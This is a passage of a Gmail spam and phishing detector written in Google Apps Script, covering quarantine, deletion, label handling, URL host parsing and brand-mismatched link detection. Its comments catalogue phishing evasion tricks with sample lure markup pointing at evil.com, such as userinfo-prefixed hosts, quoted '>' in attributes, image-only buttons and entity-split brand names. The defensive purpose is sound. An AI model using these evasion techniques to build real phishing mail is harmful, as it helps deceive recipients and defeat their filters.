function quarantineUnarchived(message, thread)
{
  try
  {
    const label = getOrCreateLabel(CONFIG.reviewLabel);
    if (label) thread.addLabel(label);
    logInfo('HELD FOR REVIEW (unarchivable): ' + sanitizeForLog(message.getSubject()));
  }
  catch (e)
  {
    logError('Could not flag unarchived message for review: ' + e.toString());
  }
}

/**
 * Quarantine a phishing message instead of destroying it (Rule 7).
 *
 * Archives the message out of the inbox and applies CONFIG.phishingLabel and
 * CONFIG.processedLabel. Performs NO batchDelete and never applies the SPAM
 * label. The message stays in All Mail indefinitely, under the Phishing label —
 * it is not subject to Gmail's 30-day spam purge, because it is not in Spam.
 *
 * Why Rule 7 does not delete, when Rules 1-6 do:
 *   Rule 7 has one residual false-positive class that cannot be driven to zero
 *   offline — a third-party CRM sending from its own domain with a brand CTA
 *   pointing at a customer-owned host that is neither a known tracker nor
 *   sender-aligned. Every other rule keys on sender reputation or content the
 *   sender chose; this one keys on a link relationship that legitimate senders
 *   can reproduce by accident. Permanent, unrecoverable deletion is the wrong
 *   default for a signal with an irreducible FP class.
 *
 * The message deliberately never enters Spam. destroySpam() sweeps that folder
 * and batch-deletes what it finds; on 2026-09-16 it destroyed a quarantined
 * message because quarantine put it in Spam and relied on a
 * search-index-dependent query to spare it. Keeping quarantined mail out of
 * Spam removes that race by construction rather than narrowing it.
 *
 * @param {GmailMessage} message - The message to quarantine.
 * @param {GmailThread}  thread  - Its thread, used for labelling and fallback.
 * @return {boolean} true if the message was quarantined (label applied or
 *                   spam-reported), false if both attempts failed.
 */
function quarantineAsPhishing(message, thread)
{
  const subject = sanitizeForLog(message.getSubject());
  let labelled = false;

  // Record the specific message id rather than setting a global "skip the
  // whole sweep" flag. destroySpam() excludes these ids from batchDelete,
  // so the safety-net sweep keeps working for everything else. The previous
  // global flag disabled the sweep for the entire execution, which combined
  // with the re-quarantine loop to disable it indefinitely.
  try { _quarantinedMessageIds.push(message.getId()); }
  catch (idError) { logError('Could not record quarantined id: ' + idError.toString()); }

  // Step 1: label the thread while it is still in place.
  //
  // Both labels matter. phishingLabel is the user-facing marker and the thing
  // buildSearchQuery() excludes; processedLabel is what stops the thread being
  // re-analysed. The thread SURVIVES a quarantine, so unlike a deletion it must
  // be marked processed or every subsequent run re-detects it.
  try
  {
    const label = getOrCreateLabel(CONFIG.phishingLabel);
    if (label)
    {
      thread.addLabel(label);
      labelled = true;
    }

    const processed = getOrCreateLabel(CONFIG.processedLabel);
    if (processed) thread.addLabel(processed);
  }
  catch (labelError)
  {
    // Non-fatal, but it does degrade the outcome: the archive below still
    // removes the message from the inbox, so a label failure leaves it in All
    // Mail with no marker the user can search for. Logged as an error for that
    // reason, not merely as a warning.
    logError('Could not apply phishing label: ' + labelError.toString());
  }

  // Step 2: archive out of the inbox. Deliberately does NOT add the SPAM
  // label, and never calls batchDelete.
  //
  // Earlier versions moved the message to SPAM so Gmail's filters would learn
  // from it, and relied on destroySpam()'s "-label:Phishing" query to spare
  // it. That query reads Gmail's SEARCH INDEX, which is eventually consistent:
  // on 2026-09-16 a Rule 7 quarantine was labelled and moved to SPAM, and
  // destroySpam() ran seconds later in the same execution before the index
  // reflected the new label, so the message was permanently deleted despite
  // the whole point of Rule 7 being that it must stay recoverable.
  //
  // Any scheme that keeps quarantined mail in SPAM and filters it out by
  // query has that race. Keeping it out of SPAM entirely removes the race by
  // construction: destroySpam() lists labelIds:['SPAM'], so a message that
  // was never given that label cannot be swept no matter what the index says.
  //
  // The cost is that Gmail's spam classifier no longer learns from Rule 7
  // hits. That is the right trade: Rule 7 is the one rule with an irreducible
  // false-positive class, and not destroying the user's mail outranks filter
  // training. Rules 1-6 still report to SPAM and still delete.
  try
  {
    const messageId = message.getId();

    if (typeof Gmail !== 'undefined' && Gmail.Users && Gmail.Users.Messages)
    {
      Gmail.Users.Messages.modify(
        { removeLabelIds: ['INBOX'] },
        'me',
        messageId
      );
    }
    else
    {
      thread.moveToArchive();
    }

    logInfo('PHISHING QUARANTINED (archived + labelled, not deleted): ' + subject);
    return true;
  }
  catch (error)
  {
    logError('Error quarantining phishing message: ' + error.toString());

    try
    {
      // moveToArchive(), NOT moveToSpam() — same reasoning as above. The
      // fallback must not put the message somewhere destroySpam() sweeps.
      thread.moveToArchive();
      logInfo('PHISHING QUARANTINED (fallback: archived): ' + subject);
      return true;
    }
    catch (fallbackError)
    {
      logError('Quarantine fallback also failed: ' + fallbackError.toString());
      // Labelled but not moved still leaves the user a visible marker.
      return labelled;
    }
  }
}

/**
 * Resolve a Gmail label name to its REST API label id, creating it if absent.
 *
 * Gmail.Users.Messages.modify() takes label IDs, not names, and GmailApp's
 * label objects do not expose the id — so a lookup is unavoidable. Cached per
 * execution because Labels.list() is a full round trip and markAsSpam() runs
 * once per detected message.
 *
 * @param {string} name - User label name.
 * @return {string|null} The label id, or null if it could not be resolved.
 */
function getLabelId(name)
{
  if (_labelIdCache[name]) return _labelIdCache[name];

  try
  {
    const res = Gmail.Users.Labels.list('me');
    const labels = (res && res.labels) || [];
    for (let i = 0; i < labels.length; i++)
    {
      if (labels[i].name === name)
      {
        _labelIdCache[name] = labels[i].id;
        return labels[i].id;
      }
    }

    const created = Gmail.Users.Labels.create(
      { name: name, labelListVisibility: 'labelShow', messageListVisibility: 'show' }, 'me');
    if (created && created.id)
    {
      logInfo('Created label: ' + name);
      _labelIdCache[name] = created.id;
      return created.id;
    }
  }
  catch (e)
  {
    logError('Could not resolve label id for "' + name + '": ' + e.toString());
  }

  return null;
}

function markAsSpam(message, thread)
{
  const subject = sanitizeForLog(message.getSubject());

  try
  {
    const messageId = message.getId();

    // Prefer Gmail Advanced Service (REST API) for precise control
    if (typeof Gmail !== 'undefined' && Gmail.Users && Gmail.Users.Messages)
    {
      // Step 1: Report as spam — trains Gmail's spam filters for future emails —
      // and tag it as ours in the same call, so destroySpam() can tell mail this
      // detector condemned apart from mail Gmail's classifier merely suspected.
      // Applied BEFORE the delete attempt: if the delete fails, the tag is what
      // lets the safety-net sweep retry it without touching anything else.
      const purgeId = getLabelId(CONFIG.purgeLabel);
      const addLabels = purgeId ? ['SPAM', purgeId] : ['SPAM'];
      if (!purgeId)
      {
        logError('Purge label unavailable — this message will not be retried by ' +
                 'destroySpam() if the immediate delete fails');
      }

      Gmail.Users.Messages.modify(
        { addLabelIds: addLabels, removeLabelIds: ['INBOX'] },
        'me',
        messageId
      );
      logInfo('SPAM REPORTED TO GOOGLE: ' + subject);

      // Step 2: Permanently delete by known message ID.
      // Uses batchDelete() because the Advanced Gmail Service has no single-message
      // delete method. Wrapping one ID in an array is the correct approach.
      try
      {
        Gmail.Users.Messages.batchDelete({ ids: [messageId] }, 'me');
        _destroyedMessageIds.push(messageId);
        logInfo('SPAM DESTROYED: ' + subject);
      }
      catch (deleteError)
      {
        // Non-fatal: destroySpam() safety net will catch this on its next sweep
        logError('Immediate delete failed (destroySpam will retry): ' + deleteError.toString());
      }
    }
    else
    {
      // Fallback: GmailApp API (no direct permanent delete available)
      thread.moveToSpam();
      logInfo('SPAM REPORTED TO GOOGLE (fallback): ' + subject);
    }
  }
  catch (error)
  {
    logError('Error marking as spam: ' + error.toString());
    logError('Subject: ' + subject);

    // Second fallback: try basic spam move if the API call failed entirely
    try
    {
      thread.moveToSpam();
      logInfo('SPAM REPORTED TO GOOGLE (fallback): ' + subject);
    }
    catch (fallbackError)
    {
      logError('Fallback also failed: ' + fallbackError.toString());
      throw error; // Both methods failed — propagate the original error
    }
  }
}


// =============================================================================
// Label Management
// =============================================================================

/**
 * Get or create a Gmail label by name.
 *
 * Used to manage the "SpamChecked" label that tracks which emails have
 * already been processed. Creates the label on first run.
 *
 * @param {string} labelName - Name of the label to get or create.
 * @return {GmailLabel} The Gmail label object.
 * @throws {Error} If label creation fails (e.g., auth issue).
 */
function getOrCreateLabel(labelName)
{
  try
  {
    let label = GmailApp.getUserLabelByName(labelName);
    if (!label)
    {
      label = GmailApp.createLabel(labelName);
      logInfo('Created new label: ' + labelName);
    }
    return label;
  }
  catch (error)
  {
    logError('Error getting/creating label: ' + error.toString());
    throw error;
  }
}


// =============================================================================
// Configuration Validation
// =============================================================================

/**
 * Validate all CONFIG values are within acceptable ranges.
 *
 * Called at the start of processInbox() to fail fast before doing any work.
 * Catches misconfiguration that could cause silent misbehavior (e.g.,
 * maxEmailsPerRun of 0 would process nothing without any error).
 *
 * @throws {Error} If any configuration value is out of range.
 */
function validateConfig()
{
  if (CONFIG.maxEmailsPerRun < 1 || CONFIG.maxEmailsPerRun > LIMITS.maxAllowedEmailsPerRun)
  {
    throw new Error('Invalid maxEmailsPerRun: must be between 1 and ' + LIMITS.maxAllowedEmailsPerRun);
  }

  if (CONFIG.daysToCheck < 0 || CONFIG.daysToCheck > LIMITS.maxAllowedDaysToCheck)
  {
    throw new Error('Invalid daysToCheck: must be between 0 and ' + LIMITS.maxAllowedDaysToCheck);
  }

  if (!CONFIG.processedLabel || CONFIG.processedLabel.length === 0)
  {
    throw new Error('Invalid processedLabel: must not be empty');
  }
}


// =============================================================================
// Input Sanitization
// =============================================================================

/**
 * Sanitize input strings to prevent memory issues from oversized content.
 *
 * Truncates to 100 KB max. Applied to subject, body, and from fields before
 * pattern matching. Some regular expressions take exponentially longer as input
 * grows (called "ReDoS" — Regular Expression Denial of Service). Capping input
 * at 100 KB closes that window; no real email field is longer than a few KB.
 *
 * @param {string} input - Input string to sanitize.
 * @return {string} Sanitized string (truncated if over 100KB). Empty string if falsy.
 */
function sanitizeInput(input)
{
  if (input == null) return '';
  const str = String(input);
  return str.length > LIMITS.maxInputChars ? str.substring(0, LIMITS.maxInputChars) : str;
}

/**
 * Strip HTML tags from a string, collapsing whitespace.
 *
 * Used as a fallback body source when getPlainBody() returns empty (HTML-only
 * email). Without this, body pattern checks (e.g. BODY_CRYPTO_PATTERNS) would
 * silently never fire on HTML-only messages.
 *
 * The regex /<[^>]+>/ has no nested quantifiers — it is O(n) on input length
 * and safe against ReDoS. Input is also pre-truncated by sanitizeInput().
 *
 * @param {string} html - Raw HTML string.
 * @return {string}       Plain text with tags removed and whitespace collapsed.
 */
function stripHtmlTags(html)
{
  return html.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim();
}

/**
 * Decode the HTML entities a mail client honours inside link text and hrefs.
 *
 * This is NOT cosmetic — a plain substring search for a brand name is defeated
 * by one entity. "D&#111;cuSign" and "Docu&shy;Sign" both render as "DocuSign"
 * in every mail client while matching no literal search.
 *
 * Numeric forms are decoded FIRST and &amp; LAST. Browsers do not double-decode,
 * so neither may we: decoding &amp; first would turn "&amp;#47;" into "/"
 * and hand an attacker a free layer of indirection.
 *
 * @param {string} str - Raw text possibly containing HTML entities.
 * @return {string} Decoded text ('' for falsy input).
 */
function decodeHtmlEntities(str)
{
  if (!str) return '';

  return String(str)
    .replace(/&#x([0-9a-f]{1,6});/gi, function(_, hex) {
      const cp = parseInt(hex, 16);
      // Guard String.fromCodePoint against RangeError on out-of-range values
      // (e.g. "&#x110000;"). An uncaught throw here would propagate to
      // analyzeMessage()'s catch-all and silently mark the message not-spam.
      return (cp > 0 && cp <= 0x10FFFF) ? String.fromCodePoint(cp) : '';
    })
    .replace(/&#(\d{1,7});/g, function(_, dec) {
      const cp = parseInt(dec, 10);
      return (cp > 0 && cp <= 0x10FFFF) ? String.fromCodePoint(cp) : '';
    })
    .replace(/&nbsp;/gi, ' ')
    .replace(/&shy;/gi,  '')
    .replace(/&quot;/gi, '"')
    .replace(/&apos;/gi, "'")
    .replace(/&lt;/gi,   '<')
    .replace(/&gt;/gi,   '>')
    .replace(/&amp;/gi,  '&');
}

/**
 * Extract the lowercase host from a URL taken from an href attribute.
 *
 * Hand-rolled because the Apps Script V8 runtime is not a browser: it exposes
 * no WHATWG URL class (nor URLSearchParams or fetch). Each normalization step
 * below exists because of a specific bypass a mail client would honour:
 *
 *   TAB/CR/LF       browsers DELETE these anywhere in a URL, so
 *                   "https://ev<TAB>il.com" navigates to evil.com. Not
 *                   stripping them means we parse a different host than the
 *                   victim's client does.
 *   backslash       browsers normalize \ to / in the authority, so
 *                   "https:\\evil.com" navigates to evil.com.
 *   scheme          only http/https carry a host we can judge. mailto:, tel:,
 *                   javascript:, cid: and data: return '' (abstain).
 *   missing slashes for special schemes "https:evil.com" is valid.
 *   userinfo        "https://docusign.net@evil.com/" has host evil.com. Split
 *                   on the LAST '@' — that is what browsers do, and browser
 *                   behaviour is what the victim experiences.
 *   port            "docusign.net:8443" -> docusign.net. IPv6 literals are
 *                   bracketed, so the colon scan must follow the ']'.
 *   trailing dot    "docusign.net." and "docusign.net" are the same host.
 *   IDN/punycode    xn--* is already ASCII and compared verbatim; never
 *                   decoded. A raw homoglyph host matches no allowlist entry,
 *                   which reads as a mismatch — the outcome we want.
 *
 * @param {string} href - href value, with HTML entities ALREADY decoded.
 * @return {string} Lowercase host without userinfo, port or trailing dot;
 *                  '' when the URL has no http(s) authority.
 */
function extractUrlHost(href)
{
  if (!href) return '';

  let s = String(href).replace(/[\t\r\n]/g, '').trim();
  if (!s) return '';
  s = s.replace(/\\/g, '/');

  let authority;
  const scheme = s.match(/^([a-z][a-z0-9+.\-]*):\/*/i);
  if (scheme)
  {
    const name = scheme[1].toLowerCase();
    if (name !== 'http' && name !== 'https') return '';
    authority = s.substring(scheme[0].length);
  }
  else if (s.substring(0, 2) === '//')
  {
    authority = s.substring(2); // scheme-relative: //host/path
  }
  else
  {
    return ''; // relative path, #fragment, or no authority at all
  }

  const end = authority.search(/[\/?#]/);
  if (end !== -1) authority = authority.substring(0, end);

  const at = authority.lastIndexOf('@');
  if (at !== -1) authority = authority.substring(at + 1);

  if (authority.charAt(0) === '[') // IPv6 literal
  {
    const close = authority.indexOf(']');
    if (close !== -1) authority = authority.substring(0, close + 1);
  }
  else
  {
    const colon = authority.indexOf(':');
    if (colon !== -1) authority = authority.substring(0, colon);
  }

  return authority.toLowerCase().replace(/\.+$/, '');
}

/**
 * True if `host` is exactly `domain` or a subdomain of it.
 *
 * Exact-or-dot-suffix is the only correct comparison:
 *   includes(domain)  accepts "notdocusign.net" AND "docusign.net.evil.com"
 *   endsWith(domain)  accepts "notdocusign.net"
 *   this              accepts "docusign.net" and "eu.docusign.net" only
 *
 * @param {string} host   - Lowercase host from extractUrlHost().
 * @param {string} domain - Lowercase registrable domain.
 * @return {boolean}
 */
function hostMatchesDomain(host, domain)
{
  if (!host || !domain) return false;
  return host === domain || host.endsWith('.' + domain);
}

/**
 * True if an email address belongs to `domain` or a subdomain of it.
 *
 * Replaces the substring `senderAddress.includes(domain)` idiom, which was a
 * whitelist bypass: "mail@linkedin.com.secure-login.top" contains
 * "linkedin.com" and so skipped ALL detection, as did "a@notlinkedin.com".
 *
 * @param {string} address - Lowercase email address (local@host).
 * @param {string} domain  - Lowercase domain from the whitelist or blacklist.
 * @return {boolean}
 */
function addressMatchesDomain(address, domain)
{
  if (!address || !domain) return false;

  const at = address.lastIndexOf('@');
  const host = (at === -1 ? address : address.substring(at + 1))
    .toLowerCase().replace(/\.+$/, '');

  // Some list entries are deliberately not registrable domains (e.g.
  // 'dragonfly', 'financebuzz'). Those keep substring semantics — but ONLY
  // against the HOST, never the full address.
  //
  // Matching the full address let the local part satisfy the check, and the
  // local part is attacker-chosen:
  //   dragonfly@attacker.tld          -> whitelisted, all detection skipped
  //   financebuzz@realcompany.com     -> blacklisted, Rule 1, PERMANENTLY DELETED
  // The first is a free bypass of the entire detector (and this list is public
  // in the repo); the second destroys a legitimate email. Nine of the
  // blacklist entries have no dot, so the delete path was broadly exposed.
  if (domain.indexOf('.') === -1 || domain.indexOf('@') !== -1)
  {
    // An entry containing '@' was written to match an address fragment
    // (e.g. 'customerservice@stan'), so compare it against the whole address;
    // otherwise restrict the substring test to the host.
    if (domain.indexOf('@') !== -1)
    {
      // Entry written as localpart@hostprefix (e.g. 'customerservice@stan').
      // Require the match to start the address AND end on a domain-label
      // boundary. Without the boundary check 'customerservice@stan' also
      // whitelists 'customerservice@stanley-evil.com' - an attacker need only
      // register a domain beginning with the prefix.
      if (address.indexOf(domain) !== 0) return false;
      const next = address.charAt(domain.length);
      return next === '' || next === '.';
    }
    return host.indexOf(domain) !== -1;
  }

  return hostMatchesDomain(host, domain);
}

/**
 * True if a host is a click-tracker, link-wrapper or security rewriter.
 *
 * Two mechanisms, both needed: an explicit list of ESP/gateway domains, and a
 * leftmost-label heuristic for customer-CNAMEd trackers ("click.acme.com").
 *
 * @param {string} host - Lowercase host from extractUrlHost().
 * @return {boolean}
 */
function isLinkWrapperHost(host, senderHost)
{
  if (!host) return false;

  for (let i = 0; i < LINK_WRAPPER_DOMAINS.length; i++)
  {
    if (hostMatchesDomain(host, LINK_WRAPPER_DOMAINS[i])) return true;
  }

  // The leftmost-label heuristic is honoured ONLY when the host sits under the
  // sender's own domain.
  //
  // Applied globally it was a one-DNS-record bypass of Signal 7: the attacker
  // points the lure at r.evil.com or click.evil.com and the signal abstains,
  // because 'r' and 'click' are tracker labels. The original Capital B lure
  // would have escaped entirely for the cost of one CNAME.
  //
  // The real pattern this models — a sender CNAMEing their own subdomain onto
  // an ESP's click tracker — is always on the sender's own registrable domain
  // (click.acme.com in mail from acme.com). Requiring that alignment keeps the
  // abstention that matters and closes the bypass. Third-party ESP trackers are
  // unaffected: they match LINK_WRAPPER_DOMAINS above.
  if (!senderHost) return false;

  const firstLabel = host.split('.')[0];
  if (TRACKER_LABELS.indexOf(firstLabel) === -1) return false;

  const parent = host.substring(firstLabel.length + 1);
  return parent !== '' && (hostMatchesDomain(parent, senderHost) ||
                           hostMatchesDomain(senderHost, parent));
}

/**
 * Extract href/text pairs from HTML anchors.
 *
 * Deliberately NOT a paired-tag regex. A pattern like
 *   /<a[^>]*>([\s\S]*?)<\/a>/g
 * is polynomial in (anchor count x document length) on attacker-controlled
 * input: every <a> with no closing </a> makes the engine scan to
 * end-of-document before failing, so 900 unclosed anchors in a 4 MB body costs
 * ~3e9 character steps — tens of seconds inside a 6-minute total budget. Mail
 * clients tolerate unclosed anchors, so this is trivially reachable.
 *
 * Instead: one BOUNDED regex for the open tag, then String.indexOf() for the
 * close. indexOf is a native linear scan with no backtracking. It does scan to
 * end-of-document; maxAnchorTextChars caps the substring we KEEP, not the
 * search, so the real bound is maxAnchorsScanned x maxHtmlScanChars — measured
 * at ~9ms worst case. Every quantifier below is explicitly bounded too, so a
 * malformed tag missing its '>' cannot walk the document.
 *
 * @param {string} html - Decoded HTML body from message.getBody().
 * @return {Array<Object>} At most LIMITS.maxAnchorsScanned objects with
 *                         `href` and `text` string properties.
 */
function findTagEnd(html, startIdx, limit)
{
  // Quote-aware scan for the '>' that actually closes a tag.
  //
  // A regex like /<a\s[^>]*>/ terminates at the FIRST '>', including one
  // inside a quoted attribute value. That made
  //     <a title=">" href="https://evil.com/">VIEW IN DOCUSIGN</a>
  // invisible to Signal 7: the "tag" ended at the title's '>', contained no
  // href, and the scan resumed past the real one. Every mail client renders
  // and navigates that anchor normally, so it was a zero-cost bypass.
  //
  // Character scan rather than regex: bounded, linear, no backtracking.
  let quote = '';
  const end = Math.min(startIdx + limit, html.length);

  for (let i = startIdx; i < end; i++)
  {
    const c = html.charAt(i);

    if (quote)
    {
      if (c === quote) quote = '';
      continue;
    }
    if (c === '"' || c === "'") { quote = c; continue; }
    if (c === '>') return i;
  }

  return -1; // unterminated within the bound
}

/**
 * Pull every value of the given attributes out of a bounded HTML fragment.
 *
 * Used for two purposes: reading href off an anchor's own tag, and harvesting
 * the accessible-name attributes (alt/title/aria-label) that a mail client
 * shows the user but a tag-stripper throws away.
 *
 * Safe against ReDoS by construction — callers pass a fragment already bounded
 * by maxAnchorTagChars or maxAnchorTextChars.
 *
 * @param {string} fragment - Bounded HTML.
 * @param {string} namePattern - Alternation of attribute names, e.g. 'alt|title'.
 * @return {Array<string>} Decoded values, in document order.
 */
function extractAttributeValues(fragment, namePattern)
{
  const out = [];
  if (!fragment) return out;

  const re = new RegExp(
    // [\\s/] not just \\s: HTML5 allows '/' as an attribute separator, so
    // <a/href="..."> is a valid anchor that clients navigate normally. Requiring
    // whitespace made it invisible to Signal 7 for the cost of one character.
    '[\\s/](?:' + namePattern + ')\\s*=\\s*(?:"([^"]*)"|\'([^\']*)\'|([^\\s"\'>]*))',
    'gi');

  let m;
  while ((m = re.exec(fragment)) !== null)
  {
    if (m.index === re.lastIndex) { re.lastIndex++; continue; }
    const v = m[1] !== undefined ? m[1] : (m[2] !== undefined ? m[2] : m[3]);
    if (v) out.push(decodeHtmlEntities(v));
    if (out.length >= 32) break; // a tag with 32 alt attributes is not real
  }

  return out;
}

function extractAnchors(html)
{
  const out = [];
  if (!html) return out;

  const scan = html.length > LIMITS.maxHtmlScanChars
    ? html.substring(0, LIMITS.maxHtmlScanChars)
    : html;

  const lower = scan.toLowerCase();
  let searchFrom = 0;

  while (out.length < LIMITS.maxAnchorsScanned)
  {
    const tagStart = lower.indexOf('<a', searchFrom);
    if (tagStart === -1) break;

    // The character after "<a" must be whitespace or '/'. Requiring only
    // whitespace missed <a/href="..."> — '/' is a valid attribute separator in
    // HTML5 and clients navigate it fine. Anything else (<abbr>, <article>)
    // is a different element.
    const next = scan.charAt(tagStart + 2);
    if (next !== '/' && !/\s/.test(next))
    {
      searchFrom = tagStart + 2;
      continue;
    }

    const tagEnd = findTagEnd(scan, tagStart, LIMITS.maxAnchorTagChars);
    if (tagEnd === -1) { searchFrom = tagStart + 2; continue; }

    const tag  = scan.substring(tagStart, tagEnd + 1);
    const hrefs = extractAttributeValues(tag, 'href');
    searchFrom  = tagEnd + 1;
    if (hrefs.length === 0) continue;

    const textStart = tagEnd + 1;
    const closeIdx  = lower.indexOf('</a', textStart);
    // indexOf() scans to end-of-document; maxAnchorTextChars caps the substring
    // we KEEP, not the search. The overall bound is therefore
    // maxAnchorsScanned x maxHtmlScanChars, measured at ~9ms worst case.
    const cap     = Math.min(textStart + LIMITS.maxAnchorTextChars, scan.length);
    const textEnd = (closeIdx === -1 || closeIdx > cap) ? cap : closeIdx;
    const innerRaw = scan.substring(textStart, textEnd);

    // Visible text: strip nested markup so <span>Docu</span><span>Sign</span>
    // collapses to "DocuSign" — attackers split brand names across elements.
    const visible = decodeHtmlEntities(innerRaw.replace(/<[^>]{0,2000}>/g, ''));

    // Accessible text: alt, title and aria-label, from the anchor's own tag and
    // from anything nested inside it.
    //
    // Without this an image button defeated Signal 7 completely:
    //     <a href="https://evil.com/"><img alt="View in DocuSign"></a>
    // There is no text node at all, so the stripper produced an empty string.
    // This is not an exotic evasion — an image CTA is what real phishing
    // already uses, because it renders identically and dodges text scanners.
    // A mail client shows the user "View in DocuSign"; now so do we.
    const accessible = extractAttributeValues(tag, 'title|aria-label')
      .concat(extractAttributeValues(innerRaw, 'alt|title|aria-label'))
      .join(' ');

    const text = (visible + ' ' + accessible).replace(/\s+/g, ' ').trim();

    // A single anchor can legitimately carry several hrefs only if malformed;
    // judge the first, which is what a client honours.
    out.push({ href: hrefs[0], text: text });

    if (textEnd > searchFrom) searchFrom = textEnd;
  }

  return out;
}

/**
 * Detect a call-to-action link that borrows a document brand's name while
 * pointing somewhere that brand does not control.
 *
 * All four conditions must hold for an anchor to fire:
 *   1. normalized link text contains a BRAND_CTA_DOMAINS key, carries a
 *      CTA verb, and its NORMALIZED text is <= 80 chars (a button label,
 *      not prose) — measured after stripping non-alphanumerics, so padding
 *      with zero-width characters cannot inflate it past the bound
 *   2. href resolves to an http(s) host
 *   3. that host matches none of the brand's legitimate domains
 *   4. that host is not a link wrapper, and is not aligned with the sender's
 *      own domain
 *
 * Condition 4's wrapper exemption is what keeps legitimate ESP-tracked mail
 * out; condition 1's verb and length requirements are what keep a genuine
 * DocuSign email's "About DocuSign" footer prose out.
 *
 * @param {string} html          - Decoded HTML body.
 * @param {string} senderAddress - Lowercase sender email address.
 * @return {boolean} true if a brand-mismatched CTA is present.
 */
function hasBrandMismatchedCta(html, senderAddress)
{
  if (!html) return false;

  // Cheap necessary-condition gate: no anchors, no brand CTA. This is the only
  // safe document-level shortcut available.
  //
  // A tempting stronger gate — indexOf(brandKey) over the whole HTML before
  // walking anchors — is WRONG, and silently so. Link text is normalized
  // per-anchor (tags stripped, entities decoded, punctuation removed) precisely
  // because attackers write "D&#111;cu&shy;Sign" or
  // "<span>Docu</span><span>Sign</span>". Neither contains the literal
  // "docusign", so a raw-HTML brand gate rejects exactly the evasions the
  // normalization exists to catch. The gate would have to normalize the whole
  // document to be correct, which costs as much as the bounded anchor walk it
  // was meant to avoid. So: no brand pre-gate. The walk is bounded by
  // LIMITS (256 KB scanned, 300 anchors, 2 KB text each) and measures ~1 ms.
  if (html.indexOf('<a') === -1) return false;

  const brands     = Object.keys(BRAND_CTA_DOMAINS);
  const senderAt   = senderAddress ? senderAddress.lastIndexOf('@') : -1;
  const senderHost = senderAt === -1 ? '' : senderAddress.substring(senderAt + 1);

  const anchors = extractAnchors(html);
  for (let a = 0; a < anchors.length; a++)
  {
    const text = anchors[a].text;
    if (!text) continue;
    if (!CTA_VERB_PATTERN.test(text)) continue;

    // Normalize away spacing and punctuation so "Docu Sign", "Docu-Sign" and
    // "DOCUSIGN->" all collapse onto the bare key form.
    const normText = text.toLowerCase().replace(/[^a-z0-9]+/g, '');

    // Length bound measured on the NORMALIZED text, not the raw text.
    //
    // Measuring raw length was evadable two ways, one of them accidental:
    //   - padding with characters JS \s does not match (U+200B zero-width
    //     space) inflated length past the cap while rendering identically;
    //   - an ordinary verbose label — "Please review and open your secure
    //     DocuSign document envelope today" (67 chars) — exceeded it with no
    //     trickery at all.
    // Counting only alphanumerics makes padding useless, and 80 leaves room
    // for genuinely wordy buttons while still excluding prose paragraphs.
    if (normText.length > 80) continue;

    for (let b = 0; b < brands.length; b++)
    {
      const brand = brands[b];
      if (normText.indexOf(brand) === -1) continue;

      const host = extractUrlHost(anchors[a].href);
      if (!host) break;                       // mailto:/relative — abstain

      const legit = BRAND_CTA_DOMAINS[brand];
      let isLegit = false;
      for (let d = 0; d < legit.length; d++)
      {
        if (hostMatchesDomain(host, legit[d])) { isLegit = true; break; }
      }
      if (isLegit) break;                     // genuine brand destination

      if (isLinkWrapperHost(host, senderHost)) break; // wrapped — destination unknown

      // Aligned with the sender's own domain: a company linking its own
      // infrastructure is not impersonating anyone.
      if (senderHost && (hostMatchesDomain(host, senderHost) ||
                         hostMatchesDomain(senderHost, host))) break;

      logDebug('Brand-mismatched CTA: text=' + sanitizeForLog(text) +
               ' brand=' + brand + ' host=' + sanitizeForLog(host));
      return true;
    }
  }

  return false;
}

/**
 * Extract the email address from a From header value.
 *
 * Handles both "Display Name <user@domain.com>" and bare "user@domain.com".
 * Used so whitelist/blacklist checks operate on the actual sender address,
 * not the display name — prevents display-name spoofing such as:
 *   "LinkedIn News <spammer@spam.com>" bypassing the whitelist, or
 *   "financeinsiderpro.com news <legit@gmail.com>" triggering the blacklist.
 *
 * @param {string} from - Normalized From header value (RFC 2822 quotes stripped).
 * @return {string}       Lowercase email address, or full from if no <> present.
 */
function extractEmailAddress(from)
{
  if (!from) return '';

  // Angle-bracket form first: "Display Name <addr@host>". Most common.
  const angled = from.match(/<([^>]+)>/);
  if (angled) return angled[1].trim().toLowerCase();

  // RFC 2822 also permits the comment form: "addr@host (Display Name)".
  // Returning the whole string here made addressMatchesDomain() derive a host
  // of "substack.com (substack digest)", which matches no whitelist entry — so
  // a WHITELISTED sender using this form failed the whitelist check. That was
  // harmless while the consequence was "stays in the Spam folder"; it becomes
  // data loss the moment any path deletes on a failed whitelist match.
  const commented = from.match(/([^\s<>()]+@[^\s<>()]+)/);
  if (commented) return commented[1].trim().toLowerCase();

  return from.trim().toLowerCase();
}

/**
 * Sanitize text for safe inclusion in log messages.
 *
 * Truncates to 100 chars and strips newlines to prevent "log injection".
 * Example: a spam subject of "OK\n[ERROR] Deleted your inbox" would print two
 * separate log lines without sanitization — the second line looks like the
 * script emitted it. Stripping newlines closes that loophole.
 *
 * @param {string} text - Text to sanitize for logging.
 * @return {string} Truncated, single-line string safe for log output.
 */
function sanitizeForLog(text)
{
  if (text == null) return '';
  return String(text).substring(0, LIMITS.maxLogChars).replace(/[\n\r]/g, ' ');
}


// =============================================================================
// Logging
// =============================================================================

/**
 * Log an informational message (always visible in Apps Script logs).
 *
 * @param {string} message - Message to log.
 */
function logInfo(message)
{
  Logger.log('[INFO] ' + message);
}

/**
 * Log a debug message (only visible when CONFIG.debug is true).
 *
 * Used for per-email signal details during troubleshooting.
 * Disabled in production to reduce log noise.
 *
 * @param {string} message - Message to log.
 */
function logDebug(message)
{
  if (CONFIG.debug)
  {
    Logger.log('[DEBUG] ' + message);
  }
}

/**
 * Log an error message (always visible in Apps Script logs).
 *
 * @param {string} message - Error message to log.
 */
function logError(message)
{
  Logger.log('[ERROR] ' + message);

  // ALSO console.error, which is what makes this reachable from outside.
  //
  // Logger.log writes only to the Apps Script execution transcript. That is not
  // merely "the place nobody reads" — it cannot be queried by anything at all:
  // the Apps Script API needs the script.processes scope the deploy credential
  // does not hold, and Cloud Logging received nothing, so there was no way to
  // answer "did the last run succeed?" without opening the editor by hand.
  //
  // console.error goes to Cloud Logging under the attached GCP project, where
  // it is queryable and alertable. Errors only — logInfo stays on Logger.log to
  // keep the per-minute trigger's routine chatter out of Cloud Logging.
  try { console.error('[ERROR] ' + message); }
  catch (e) { /* console is absent in some contexts; never break logging */ }
}

/**
 * Emit one queryable heartbeat per run, to Cloud Logging.
 *
 * The externally verifiable answer to "is the detector alive and healthy?".
 * Absence of error rows in the Sheet proves nothing on its own — a script that
 * crashes on its first line also writes no rows, and looks identical to a clean
 * run from the outside. One line per execution distinguishes the two.
 *
